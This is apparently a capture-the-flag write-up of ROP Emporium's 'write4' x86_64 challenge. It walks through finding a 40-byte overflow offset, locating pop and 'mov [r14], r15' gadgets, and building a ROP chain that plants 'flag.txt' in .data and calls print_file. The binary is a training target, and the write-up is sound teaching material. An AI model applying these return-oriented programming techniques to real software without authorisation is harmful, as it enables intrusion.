# ROP Emporium — write4 (x86_64)

> **Category:** pwn / binary exploitation
> **Binary:** [write4](https://ropemporium.com/challenge/write4.html) (ROP Emporium, x86_64)
> **Techniques:** stack overflow → ROP, write-what-where gadget (`mov [r14], r15`), planting a string in `.data`, calling `print_file()` with a controlled pointer
> **Environment:** authorized training binary, local lab

`write4` splits the win condition in two: `print_file()` exists and works,
but the string `"flag.txt"` is **nowhere in the binary**. We must write it
into writable memory ourselves, then pass its address.

## 1. Recon

```
$ file write4
write4: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

NX on, no PIE, symbols present — same profile as the rest of the series.
`pwnme()` (in `libwrite4.so`) has the usual 32-byte stack buffer read with
`read(0, buf, 0x200)`, so the return address sits at offset **40**.

## 2. The missing string

```
$ strings write4 | grep flag
(nothing — "flag.txt" is not in the binary)
```

`usefulFunction()` calls `print_file("nonexistent.txt")` — a dead end. The
challenge is exactly this: get `"flag.txt"` into memory ourselves.

## 3. The write primitive

`usefulGadgets()` hands us a two-register write-what-where:

```
0000000000400628 <usefulGadgets>:
  400628:  mov    [r14], r15
  40062b:  ret
```

To drive it we need to control `r14` and `r15`. Byte-scanning `.text` for
the classic `__libc_csu_init` epilogue:

```
pop r14 ; pop r15 ; ret  @ 0x400690   (bytes 41 5e 41 5f c3)
pop rdi ; ret            @ 0x400693   (byte pattern 5f c3, one byte into 41 5f)
```

`pop rdi` hides *inside* `pop r15` — gadget hunting by bytes, not by
instructions.

Writable target: `.data` at `0x601028` (16 zero bytes) — enough for
`"flag.txt"` plus the NUL terminator that's already there.

## 4. The chain

`"flag.txt"` is exactly 8 bytes — a single `mov [r14], r15` plants it whole:

```
[ 40 * "A"          ]  buffer + saved rbp
[ 0x400690        ]  pop r14 ; pop r15 ; ret
[ 0x601028        ]  r14 = &.data
[ "flag.txt"      ]  r15 = the string (as an immediate qword)
[ 0x400628        ]  mov [r14], r15      -> .data now holds "flag.txt"
[ 0x400693        ]  pop rdi ; ret
[ 0x601028        ]  rdi = &.data
[ 0x400510        ]  print_file@plt
```

## 5. Run

```
$ python3 exploit.py
write4 by ROP Emporium
x86_64
Go ahead and give me the input already!
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

Flag: `ROPE{a_placeholder_32byte_flag!}` (ROP Emporium's static placeholder).

## Takeaway

The jump from ret2win/split to write4 is realizing that **data can travel
through registers**: any `mov [rA], rB` gadget plus two pops turns the stack
into a memory writer, and once you can write, missing strings stop mattering.
